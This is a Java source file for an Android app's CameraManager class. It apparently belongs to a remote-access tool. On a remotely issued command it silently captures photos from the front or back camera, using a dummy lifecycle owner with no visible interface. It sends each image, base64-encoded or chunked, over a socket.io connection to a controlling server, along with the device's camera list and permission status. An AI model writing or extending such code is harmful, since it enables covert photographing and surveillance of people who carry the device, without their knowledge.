package com.fason.app.features.camera;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Base64;

import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;

import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import com.fason.app.service.MainService;
import com.google.common.util.concurrent.ListenableFuture;

import org.json.JSONArray;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraManager {

    private final Context ctx;
    private final Executor mainExec;
    private final ExecutorService camExec;
    private final ExecutorService sendExec;
    private ProcessCameraProvider provider;
    private ImageCapture capture;
    private final AtomicBoolean init = new AtomicBoolean(false);
    private final AtomicBoolean capturing = new AtomicBoolean(false);

    public CameraManager(Context context) {
        this.ctx = context.getApplicationContext();
        this.mainExec = ContextCompat.getMainExecutor(ctx);
        this.camExec = Executors.newSingleThreadExecutor();
        this.sendExec = Executors.newSingleThreadExecutor();
        init();
    }

    private void init() {
        camExec.execute(() -> {
            try {
                ListenableFuture<ProcessCameraProvider> future =
                    ProcessCameraProvider.getInstance(ctx);

                future.addListener(() -> {
                    try {
                        provider = future.get();
                        capture = new ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .setJpegQuality(80)
                            .setFlashMode(ImageCapture.FLASH_MODE_AUTO)
                            .build();
                        init.set(true);
                    } catch (Exception ignored) {}
                }, mainExec);
            } catch (Exception ignored) {}
        });
    }

    private boolean hasPerm() {
        return ctx.checkSelfPermission(Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }

    private static void releaseCameraType() {
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
    }

    public void capture(int camId) {
        if (!hasPerm()) {
            sendError(camId, "No camera permission");
            return;
        }

        if (capturing.getAndSet(true)) return;

        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }

        camExec.execute(() -> {
            try {
                if (!ensureInit()) {
                    sendError(camId, "Camera init failed");
                    capturing.set(false);
                    releaseCameraType();
                    return;
                }
                doCapture(camId);
            } catch (Exception e) {
                sendError(camId, "Capture failed: " + e.getMessage());
                capturing.set(false);
                releaseCameraType();
            }
        });
    }

    private boolean ensureInit() {
        if (init.get() && provider != null) return true;

        CountDownLatch latch = new CountDownLatch(1);
        try {
            ListenableFuture<ProcessCameraProvider> future =
                ProcessCameraProvider.getInstance(ctx);
            future.addListener(() -> {
                try {
                    provider = future.get();
                    capture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .setJpegQuality(80)
                        .build();
                    init.set(true);
                } catch (Exception ignored) {}
                latch.countDown();
            }, mainExec);
        } catch (Exception e) {
            latch.countDown();
        }

        try {
            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception ignored) {}

        return init.get() && provider != null;
    }

    private void doCapture(int camId) {
        if (provider == null || capture == null) {
            sendError(camId, "Camera not ready");
            capturing.set(false);
            releaseCameraType();
            return;
        }

        boolean front = camId == 1;
        CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;

        try {
            sel.filter(provider.getAvailableCameraInfos());
        } catch (Exception e) {
            sendError(camId, front ? "No front camera" : "No back camera");
            capturing.set(false);
            releaseCameraType();
            return;
        }

        mainExec.execute(() -> {
            try {
                provider.unbindAll();
                provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, capture);

                camExec.execute(() -> {
                    try {
                        Thread.sleep(200); // Brief delay for sensor warmup
                        mainExec.execute(() -> takePicture(camId));
                    } catch (Exception e) {
                        capturing.set(false);
                    }
                });
            } catch (Exception e) {
                sendError(camId, "Bind failed: " + e.getMessage());
                capturing.set(false);
                releaseCameraType();
            }
        });
    }

    private void takePicture(int camId) {
        if (capture == null) {
            sendError(camId, "Capture not ready");
            capturing.set(false);
            releaseCameraType();
            return;
        }

        capture.takePicture(mainExec, new ImageCapture.OnImageCapturedCallback() {
            @Override
            public void onCaptureSuccess(ImageProxy image) {
                sendExec.execute(() -> {
                    try {
                        ByteBuffer buf = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        send(bytes, camId);
                    } catch (Exception e) {
                        sendError(camId, "Image process failed");
                        capturing.set(false);
                        releaseCameraType();
                    } finally {
                        mainExec.execute(() -> {
                            image.close();
                            capturing.set(false);
                            releaseCameraType();
                        });
                    }
                });
            }

            @Override
            public void onError(ImageCaptureException e) {
                sendError(camId, "Capture error: " + e.getMessage());
                capturing.set(false);
                releaseCameraType();
                init.set(false);
                camExec.execute(CameraManager.this::init);
            }
        });
    }

    private void send(byte[] data, int camId) {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            if (s == null) return;
            if (TransferHelper.shouldChunk(data.length)) {
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_IMAGE, true);
                meta.put(Protocol.KEY_CAMERA_ID, camId);
                meta.put(Protocol.KEY_SIZE, data.length);
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                TransferHelper.sendChunked(s, Protocol.CAMERA, data, meta);
            } else {
                JSONObject obj = new JSONObject();
                obj.put(Protocol.KEY_IMAGE, true);
                obj.put(Protocol.KEY_CAMERA_ID, camId);
                obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put(Protocol.KEY_SIZE, data.length);
                obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                s.emit(Protocol.CAMERA, obj);
            }
        } catch (Exception ignored) {}
    }

    private void sendError(int camId, String error) {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            if (s == null) return;
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_IMAGE, false);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            s.emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    public JSONObject getCameraList() {
        try {
            JSONArray list = new JSONArray();

            if (provider != null) {
                try {
                    CameraSelector.DEFAULT_FRONT_CAMERA.filter(provider.getAvailableCameraInfos());
                    JSONObject front = new JSONObject();
                    front.put(Protocol.KEY_ID, 1);
                    front.put(Protocol.KEY_NAME, "Front");
                    list.put(front);
                } catch (Exception ignored) {}

                try {
                    CameraSelector.DEFAULT_BACK_CAMERA.filter(provider.getAvailableCameraInfos());
                    JSONObject back = new JSONObject();
                    back.put(Protocol.KEY_ID, 0);
                    back.put(Protocol.KEY_NAME, "Back");
                    list.put(back);
                } catch (Exception ignored) {}
            }

            if (list.length() == 0) {
                JSONObject back = new JSONObject();
                back.put(Protocol.KEY_ID, 0);
                back.put(Protocol.KEY_NAME, "Back");
                list.put(back);

                JSONObject front = new JSONObject();
                front.put(Protocol.KEY_ID, 1);
                front.put(Protocol.KEY_NAME, "Front");
                list.put(front);
            }

            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_CAM_LIST, true);
            result.put(Protocol.KEY_LIST, list);
            result.put(Protocol.KEY_HAS_PERM, hasPerm());
            return result;

        } catch (Exception e) {
            try {
                JSONObject result = new JSONObject();
                result.put(Protocol.KEY_CAM_LIST, true);
                result.put(Protocol.KEY_LIST, new JSONArray());
                result.put(Protocol.KEY_ERROR, e.getMessage());
                return result;
            } catch (Exception ignored) {}
            return null;
        }
    }

    public void shutdown() {
        if (provider != null) {
            try { provider.unbindAll(); } catch (Exception ignored) {}
        }
        camExec.shutdown();
        sendExec.shutdown();
    }
}
